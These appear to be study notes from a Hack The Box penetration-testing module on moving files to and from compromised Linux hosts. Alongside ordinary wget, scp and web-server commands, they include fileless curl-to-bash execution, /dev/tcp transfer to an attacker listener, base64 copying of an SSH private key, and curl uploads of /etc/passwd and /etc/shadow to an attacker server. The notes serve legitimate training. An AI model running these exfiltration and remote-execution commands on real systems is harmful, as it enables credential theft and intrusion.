# Download Operations
## Base64 Encoding / Decoding
If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation.
*Note:* Before and After moving the files we calculate the md5sum of them, to ensure the are the same.
```shell-session
KruKnight@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
We use `cat` to print the file content, and base64 encode the output using a pipe `|`. We used the option `-w 0` to create only one line and ended up with the command with a semi-colon (;) and `echo` keyword to start a new line and make it easier to copy.
```shell-session
KruKnight@htb[/htb]$ cat id_rsa |base64 -w 0;echo
```
- In attacker box to decode it:
```shell-session
KruKnight@htb[/htb]$ echo -n 'LS0tLS1CRUdJNXQ0UExZYzZOYWRIc0JTWD[[SNIP]]JWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

## Web Downloads with Wget and cURL
#### Download a File Using wget
To download a file using `wget`, we need to specify the URL and the option `-O' to set the output filename.
```shell-session
KruKnight@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
#### Download a File Using cURL
`cURL` is very similar to `wget`, but the output filename option is lowercase `-o'.
```shell-session
KruKnight@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Fileless Attacks Using Linux
#### Fileless Download with cURL
```shell-session
KruKnight@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
#### Fileless Download with wget
```shell-session
KruKnight@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

## Download with Bash (/dev/tcp)
- In Attacker machine, open netcat with `nc -nvlp > fileName.txt`
- In Target machine, create a connection with `cat fileName.txt > /dev/tcp/IP/PORT/`

## SSH Downloads
SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.
#### Linux - Downloading Files Using SCP
```shell-session
KruKnight@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```
#### File Upload using SCP
```shell-session
KruKnight@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

# Upload Operations
## Web Upload
#### Pwnbox - Start Web Server
The first thing we need to do is to install the `uploadserver` module.
```shell-session
KruKnight@htb[/htb]$ sudo python3 -m pip install --user uploadserver
```
Now we need to create a certificate. In this example, we are using a self-signed certificate.
#### Pwnbox - Create a Self-Signed Certificate
```shell-session
KruKnight@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver. e, g: `www`
#### Pwnbox - Start Web Server
```shell-session
KruKnight@htb[/htb]$ mkdir https && cd https
```
```shell-session
KruKnight@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.
#### Linux - Upload Multiple Files
```shell-session
KruKnight@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
We used the option `--insecure` because we used a self-signed certificate that we trust.

## Alternative Web File Transfer Method
It is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server
#### Linux - Creating a Web Server with Python3
```shell-session
KruKnight@htb[/htb]$ python3 -m http.server
```
#### Linux - Creating a Web Server with PHP
```shell-session
KruKnight@htb[/htb]$ php -S 0.0.0.0:8000
```
#### Linux - Creating a Web Server with Ruby
```shell-session
KruKnight@htb[/htb]$ ruby -run -ehttpd . -p8000
```
#### Download to attack box
```shell-session
KruKnight@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
```


